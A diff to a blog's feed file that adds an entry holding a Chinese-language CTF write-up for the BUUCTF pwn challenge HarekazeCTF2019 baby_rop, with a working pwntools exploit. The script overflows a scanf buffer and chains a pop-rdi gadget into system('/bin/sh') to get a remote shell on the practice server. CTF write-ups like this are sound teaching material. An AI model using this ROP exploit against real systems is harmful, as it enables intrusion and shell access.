@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>BUUCTF-PWN-[HarekazeCTF2019]baby_rop</title>
+      <link href="/20211206-ctf-babyrop/"/>
+      <url>/20211206-ctf-babyrop/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-HarekazeCTF2019-baby-rop"><a href="#BUUCTF-PWN-HarekazeCTF2019-baby-rop" class="headerlink" title="BUUCTF-PWN-[HarekazeCTF2019]baby_rop"></a>BUUCTF-PWN-[HarekazeCTF2019]baby_rop</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202112061940178.png" alt="image-20211206194026085"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202112061943497.png" alt="image-20211206194313963"></p><p>scanf可以溢出</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202112061945187.png" alt="image-20211206194554078"></p><h3 id="查看string"><a href="#查看string" class="headerlink" title="查看string"></a>查看string</h3><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202112061944264.png" alt="image-20211206194415330"></p><p>发现binsh</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>先覆盖变量v4，溢出到rdi，然后带上binsh参数调用system函数</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25780</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400683</span></span><br><span class="line">binsh_addr = <span class="number">0x601048</span></span><br><span class="line">sys_addr = <span class="number">0x400490</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> + <span class="number">8</span>), p64(rdi), p64(binsh_addr), p64(sys_addr))</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>注意：这题的flag在home下的文件夹babyrop里面</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202112062033583.png" alt="image-20211206203305583"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>BUUCTF-PWN-not_the_same_3dsctf_2016</title>
       <link href="/20211205-ctf-nts32/"/>
       <url>/20211205-ctf-nts32/</url>
